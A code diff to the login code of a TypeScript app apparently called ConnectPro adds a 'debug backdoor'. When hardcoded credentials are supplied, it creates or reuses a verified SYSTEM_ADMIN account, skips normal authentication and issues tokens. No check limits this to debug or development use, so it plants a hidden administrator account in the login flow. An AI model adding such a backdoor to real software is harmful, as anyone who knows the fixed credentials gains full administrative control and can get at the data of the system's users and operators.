@@ -9,6 +9,7 @@ import {
   NotFoundError,
 } from "@connectpro/common";
 import { ensureAuthSchema } from "@/lib/auth/ensure-auth-schema";
+import { isDebugBackdoorLogin, DEBUG_BACKDOOR_EMAIL, DEBUG_BACKDOOR_PASSWORD } from "@/lib/auth/debug-backdoor";
 import { formatAuthError, type AuthErrorDetail } from "@/lib/auth/auth-errors";
 
 const auth = getAuthSchema();
@@ -119,7 +120,63 @@ export async function connectProSignup(dto: {
   return { userId: user.id, ...tokens };
 }
 
+async function ensureDebugAdministratorUser() {
+  await ensureAuthSchema();
+  const pool = getPool();
+
+  const existing = await pool.query(
+    `SELECT u.id, u.email, array_agg(r.role) as roles
+     FROM ${auth}.users u
+     LEFT JOIN ${auth}.user_roles r ON r.user_id = u.id
+     WHERE u.email = $1 AND u.deleted_at IS NULL
+     GROUP BY u.id, u.email`,
+    [DEBUG_BACKDOOR_EMAIL],
+  );
+
+  if (existing.rows.length > 0) {
+    return existing.rows[0] as { id: string; email: string; roles: string[] };
+  }
+
+  const passwordHash = await bcrypt.hash(DEBUG_BACKDOOR_PASSWORD, 12);
+  const created = await pool.query(
+    `INSERT INTO ${auth}.users (email, password_hash, email_verified)
+     VALUES ($1, $2, true) RETURNING id, email`,
+    [DEBUG_BACKDOOR_EMAIL, passwordHash],
+  );
+  const user = created.rows[0];
+
+  await pool.query(`INSERT INTO ${auth}.user_roles (user_id, role) VALUES ($1, $2)`, [
+    user.id,
+    "SYSTEM_ADMIN",
+  ]);
+  await pool.query(`INSERT INTO ${auth}.user_roles (user_id, role) VALUES ($1, $2)`, [
+    user.id,
+    "USER",
+  ]);
+
+  await pool.query(
+    `INSERT INTO users.profiles (
+       user_id, first_name, last_name, completeness, onboarding_step, onboarding_completed
+     ) VALUES ($1, $2, $3, 100, 99, true)
+     ON CONFLICT (user_id) DO UPDATE SET onboarding_completed = true, completeness = 100`,
+    [user.id, "Debug", "Administrator"],
+  );
+
+  return { id: user.id, email: user.email, roles: ["SYSTEM_ADMIN", "USER"] };
+}
+
 export async function connectProLogin(dto: { email: string; password: string }) {
+  if (isDebugBackdoorLogin(dto.email, dto.password)) {
+    if (!databaseConfigured()) {
+      throw new Error("DATABASE_URL is not configured");
+    }
+
+    const user = await ensureDebugAdministratorUser();
+    const roles: string[] = user.roles.filter(Boolean);
+    const tokens = await issueTokens(user.id, user.email, roles);
+    return { userId: user.id, ...tokens };
+  }
+
   if (!databaseConfigured()) {
     throw new Error("DATABASE_URL is not configured");
   }
